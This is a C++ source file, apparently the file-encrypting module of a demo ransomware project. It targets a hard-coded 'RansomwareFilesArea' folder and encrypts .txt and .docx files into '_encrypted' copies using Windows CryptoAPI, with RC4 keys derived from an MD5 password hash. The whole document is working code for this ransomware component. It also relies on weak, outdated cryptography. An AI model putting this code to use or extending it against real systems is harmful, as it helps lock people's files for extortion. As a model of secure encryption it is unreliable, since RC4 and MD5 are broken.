
#include <tchar.h>
#include <stdio.h>
#include "Encryption.h"
#include <conio.h>

// Link with the Advapi32.lib file.
#pragma comment (lib, "advapi32")

#define KEYLENGTH  0x00800000
#define ENCRYPT_ALGORITHM CALG_RC4 
#define ENCRYPT_BLOCK_SIZE 8

char* folder = "RansomwareFilesArea\\";

int Encrypt(std::vector<std::string> fileNames, char* password)
{
	if (fileNames.empty())	// No files found
		return -1;

	LPTSTR pszSource;
	LPTSTR pszDestination;
	LPSTR pszPassword = password;

	for each (std::string name in fileNames)
	{
		if (name.find("_encrypted") == std::string::npos)
		{
			name = folder + name;
			std::string s = name.substr(name.find("."));
			if (name.substr(name.find(".")) == ".txt")
				s = name.substr(0, name.find(".")) + "_encrypted.txt";
			else if (name.substr(name.find(".")) == ".docx")
				s = name.substr(0, name.find(".")) + "_encrypted.docx";
			else continue;

			pszSource = const_cast<char *>(name.c_str());
			pszDestination = const_cast<char *>(s.c_str());

			//---------------------------------------------------------------
			// Call EncryptFile to do the actual encryption.
			if (MyEncryptFile(pszSource, pszDestination, pszPassword))
			{
				_tprintf(TEXT("File %s encrypted. \n"), pszSource);
				_tprintf(TEXT("The encrypted data is in file %s.\n"), pszDestination);
			}
			else
				MyHandleError(TEXT("Error encrypting file!\n"), GetLastError());
		}
	}

	return 0;
}

//-------------------------------------------------------------------
// Code for the function MyEncryptFile called by main.
//-------------------------------------------------------------------
// Parameters passed are:
//  pszSource, the name of the input, a plaintext file.
//  pszDestination, the name of the output, an encrypted file to be 
//   created.
//  pszPassword, either NULL if a password is not to be used or the 
//   string that is the password.
bool MyEncryptFile(LPTSTR pszSourceFile, LPTSTR pszDestinationFile, LPTSTR pszPassword)
{
	//---------------------------------------------------------------
	// Declare and initialize local variables.
	bool fReturn = false;
	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestinationFile = INVALID_HANDLE_VALUE;

	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hKey = NULL;
	HCRYPTHASH hHash = NULL;

	PBYTE pbBuffer = NULL;
	DWORD dwBlockLen;
	DWORD dwBufferLen;
	DWORD dwCount;

	//---------------------------------------------------------------
	// Open the source file. 
	hSourceFile = CreateFile(pszSourceFile, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hSourceFile)
	{
		MyHandleError(TEXT("Error opening source plaintext file!\n"), GetLastError());
		goto Exit_MyEncryptFile;
	}

	//---------------------------------------------------------------
	// Open the destination file. 
	hDestinationFile = CreateFile(pszDestinationFile, FILE_WRITE_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hDestinationFile)
	{
		MyHandleError(TEXT("Error opening destination file!\n"), GetLastError());
		goto Exit_MyEncryptFile;
	}

	//---------------------------------------------------------------
	// Get the handle to the default provider. 
	if (!CryptAcquireContext(&hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0))
	{
		MyHandleError(
			TEXT("Error during CryptAcquireContext!\n"),
			GetLastError());
		goto Exit_MyEncryptFile;
	}

	//-----------------------------------------------------------
	// The file will be encrypted with a session key derived 
	// from a password.
	// The session key will be recreated when the file is 
	// decrypted only if the password used to create the key is 
	// available. 

	//-----------------------------------------------------------
	// Create a hash object. 
	if (!CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash))
	{
		MyHandleError(TEXT("Error during CryptCreateHash!\n"), GetLastError());
		goto Exit_MyEncryptFile;
	}

	//-----------------------------------------------------------
	// Hash the password. 
	if (!CryptHashData(hHash, (BYTE *)pszPassword, lstrlen(pszPassword), 0))
	{
		MyHandleError(TEXT("Error during CryptHashData. \n"), GetLastError());
		goto Exit_MyEncryptFile;
	}

	//-----------------------------------------------------------
	// Derive a session key from the hash object. 
	if (!CryptDeriveKey(hCryptProv, ENCRYPT_ALGORITHM, hHash, KEYLENGTH, &hKey))
	{
		MyHandleError(TEXT("Error during CryptDeriveKey!\n"), GetLastError());
		goto Exit_MyEncryptFile;
	}
	//---------------------------------------------------------------
	// The session key is now ready. If it is not a key derived from 
	// a  password, the session key encrypted with the private key 
	// has been written to the destination file.

	//---------------------------------------------------------------
	// Determine the number of bytes to encrypt at a time. 
	// This must be a multiple of ENCRYPT_BLOCK_SIZE.
	// ENCRYPT_BLOCK_SIZE is set by a #define statement.
	dwBlockLen = 1000 - 1000 % ENCRYPT_BLOCK_SIZE;

	//---------------------------------------------------------------
	// Determine the block size. If a block cipher is used, 
	// it must have room for an extra block. 
	if (ENCRYPT_BLOCK_SIZE > 1)
		dwBufferLen = dwBlockLen + ENCRYPT_BLOCK_SIZE;
	else
		dwBufferLen = dwBlockLen;

	//---------------------------------------------------------------
	// Allocate memory. 
	if (!(pbBuffer = (BYTE *)malloc(dwBufferLen)))
	{
		MyHandleError(TEXT("Out of memory. \n"), E_OUTOFMEMORY);
		goto Exit_MyEncryptFile;
	}

	//---------------------------------------------------------------
	// In a do loop, encrypt the source file, 
	// and write to the source file. 
	bool fEOF = FALSE;
	do
	{
		//-----------------------------------------------------------
		// Read up to dwBlockLen bytes from the source file. 
		if (!ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL))
		{
			MyHandleError(TEXT("Error reading plaintext!\n"), GetLastError());
			goto Exit_MyEncryptFile;
		}

		if (dwCount < dwBlockLen)
			fEOF = TRUE;

		//-----------------------------------------------------------
		// Encrypt data. 
		if (!CryptEncrypt(hKey, NULL, fEOF, 0, pbBuffer, &dwCount, dwBufferLen))
		{
			MyHandleError(TEXT("Error during CryptEncrypt. \n"), GetLastError());
			goto Exit_MyEncryptFile;
		}

		//-----------------------------------------------------------
		// Write the encrypted data to the destination file. 
		if (!WriteFile(hDestinationFile, pbBuffer, dwCount, &dwCount, NULL))
		{
			MyHandleError(TEXT("Error writing ciphertext.\n"), GetLastError());
			goto Exit_MyEncryptFile;
		}

		//-----------------------------------------------------------
		// End the do loop when the last block of the source file 
		// has been read, encrypted, and written to the destination 
		// file.
	} while (!fEOF);

	fReturn = true;

Exit_MyEncryptFile:
	//---------------------------------------------------------------
	// Close files.
	if (hSourceFile)
		CloseHandle(hSourceFile);

	if (hDestinationFile)
		CloseHandle(hDestinationFile);

	//---------------------------------------------------------------
	// Free memory. 
	if (pbBuffer)
		free(pbBuffer);

	//-----------------------------------------------------------
	// Release the hash object. 
	if (hHash)
	{
		if (!(CryptDestroyHash(hHash)))
			MyHandleError( TEXT("Error during CryptDestroyHash.\n"), GetLastError());
		hHash = NULL;
	}

	//---------------------------------------------------------------
	// Release the session key. 
	if (hKey)
		if (!(CryptDestroyKey(hKey)))
			MyHandleError(TEXT("Error during CryptDestroyKey!\n"), GetLastError());

	//---------------------------------------------------------------
	// Release the provider handle. 
	if (hCryptProv)
		if (!(CryptReleaseContext(hCryptProv, 0)))
			MyHandleError(TEXT("Error during CryptReleaseContext!\n"), GetLastError());

	return fReturn;
} // End Encryptfile.

  //-------------------------------------------------------------------
  //  This example uses the function MyHandleError, a simple error
  //  handling function, to print an error message to the  
  //  standard error (stderr) file and exit the program. 
  //  For most applications, replace this function with one 
  //  that does more extensive error reporting.

void MyHandleError(LPTSTR psz, int nErrorNumber)
{
	_ftprintf(stderr, TEXT("An error occurred in the program. \n"));
	_ftprintf(stderr, TEXT("%s\n"), psz);
	_ftprintf(stderr, TEXT("Error number %x.\n"), nErrorNumber);
}